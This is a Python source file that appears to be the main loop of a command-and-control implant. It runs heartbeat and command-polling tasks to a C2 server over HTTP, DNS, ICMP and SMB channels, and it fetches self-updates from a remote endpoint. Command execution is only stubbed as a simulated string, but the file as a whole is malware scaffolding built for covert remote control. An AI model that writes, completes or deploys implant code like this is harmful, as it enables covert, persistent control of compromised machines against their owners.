"""
Agent.agent_main

This script initializes and manages the agent's communication protocols,
handles configuration updates, and performs periodic self-updates.
"""
#!/usr/bin/env python3

import asyncio
import platform
from config import load_initial_config
from logger import logger
from update import check_for_update, perform_update

from protocols.http_comm import HTTPComm
from protocols.dns_comm import DNSComm
from protocols.icmp_comm import ICMPComm
from protocols.smb_comm import SMBComm

CURRENT_VERSION = "1.0.0"

async def heartbeat_task(comm, interval):
    """
    Periodically sends a heartbeat message via the specified communication channel.

    Args:
        comm: The communication instance.
        interval (int): The time interval (in seconds) between heartbeats.
    """
    while True:
        comm.heartbeat()
        await asyncio.sleep(interval)

async def protocol_polling_task(comm, poll_interval):
    """
    Periodically polls for commands from the C2 server and executes them.

    Args:
        comm: The communication instance.
        poll_interval (int): The polling interval in seconds.
    """
    while True:
        commands = comm.poll_commands()
        for cmd in commands:
            logger.info(f"Polling command: {cmd}")
            # Simulate command execution
            result = f"Executed: {cmd}"
            comm.send_message(result)
        await asyncio.sleep(poll_interval)

async def dynamic_config_task(config_update_interval):
    """
    Periodically checks for configuration updates.

    Args:
        config_update_interval (int): The time interval for checking updates.
    """
    while True:
        logger.info("Checking for configuration updates...")
        await asyncio.sleep(config_update_interval)

async def self_update_task(update_interval, update_endpoint):
    """
    Periodically checks for software updates and performs updates if available.

    Args:
        update_interval (int): The time interval for checking updates.
        update_endpoint (str): The endpoint to check for new versions.
    """
    while True:
        new_version = check_for_update(CURRENT_VERSION, update_endpoint)
        if new_version:
            perform_update(new_version, update_endpoint)
        await asyncio.sleep(update_interval)

async def main():
    """
    Initializes the agent, loads configurations, and starts all necessary tasks.
    """
    config = load_initial_config()
    agent_id = config.get("agent_id")
    auth_token = config.get("auth_token")
    logger.info(f"Agent running on {platform.system()} {platform.release()} with ID: {agent_id}")

    tasks = []
    protocols_config = config.get("protocols", {})

    if protocols_config.get("http", {}).get("enabled"):
        http_comm = HTTPComm(protocols_config["http"]["server_url"], agent_id, auth_token)
        tasks.append(asyncio.create_task(protocol_polling_task(http_comm, config.get("poll_interval", 10))))
        tasks.append(asyncio.create_task(heartbeat_task(http_comm, config.get("heartbeat_interval", 30))))

    if protocols_config.get("dns", {}).get("enabled"):
        dns_comm = DNSComm(protocols_config["dns"]["dns_server_ip"], agent_id, auth_token)
        tasks.append(asyncio.create_task(protocol_polling_task(dns_comm, config.get("poll_interval", 10))))
        tasks.append(asyncio.create_task(heartbeat_task(dns_comm, config.get("heartbeat_interval", 30))))

    if protocols_config.get("icmp", {}).get("enabled"):
        icmp_comm = ICMPComm(protocols_config["icmp"]["target_ip"], agent_id, auth_token)
        tasks.append(asyncio.create_task(protocol_polling_task(icmp_comm, config.get("poll_interval", 10))))
        tasks.append(asyncio.create_task(heartbeat_task(icmp_comm, config.get("heartbeat_interval", 30))))

    if protocols_config.get("smb", {}).get("enabled"):
        smb_comm = SMBComm(protocols_config["smb"]["server_ip"], agent_id, auth_token)
        tasks.append(asyncio.create_task(protocol_polling_task(smb_comm, config.get("poll_interval", 10))))
        tasks.append(asyncio.create_task(heartbeat_task(smb_comm, config.get("heartbeat_interval", 30))))

    tasks.append(asyncio.create_task(dynamic_config_task(60)))
    tasks.append(asyncio.create_task(self_update_task(300, config.get("update_endpoint", ""))))

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Agent shutting down.")
